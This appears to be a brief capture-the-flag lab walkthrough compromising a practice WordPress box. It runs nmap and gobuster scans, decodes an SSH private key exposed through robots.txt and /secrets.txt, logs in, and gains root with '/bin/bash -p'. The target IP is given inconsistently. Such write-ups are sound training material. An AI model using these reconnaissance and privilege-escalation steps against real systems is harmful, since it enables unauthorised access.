@@ -1,0 +1,45 @@
+NMAP SCAN
+=====================
+ nmap -p- --min-rate=10000 192.168.63.89
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+33060/tcp open  mysqlx
+
+Directory Scan
+=====================
+# gobuster dir -u http://192.168.63.89 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt,html
+
+http://192.168.63.89/wp-content
+http://192.168.63.89/wp-includes 
+http://192.168.63.89/javascript                                                      
+http://192.168.63.89/wp-admin 
+
+Wordpress site
+=====================
+A hint on username :
+Oh yea! Almost forgot the only user on this box is oscp
+
+http://192.168.67.89/robots.txt I get a /secrets.txt
+There is a base64 encoded text. On decoding this, I get a private ssh key.
+
+# ssh -i id_rsa oscp@192.168.67.89
+Something interesting is that the user is part of the sudo group so it will be easy to move over to root.
+-bash-5.0$ id
+uid=1000(oscp) gid=1000(oscp) groups=1000(oscp),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
+-bash-5.0$ whoami
+oscp
+-bash-5.0$ ls
+ip  local.txt
+
+Priv Esc
+-------------------
+-bash-5.0$ /bin/bash -p
+bash-5.0# id
+uid=1000(oscp) gid=1000(oscp) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd),1000(oscp)
+bash-5.0# cd /root
+bash-5.0# ls
+fix-wordpress  flag.txt  proof.txt  snap
+
+And the boox is rooted!
+
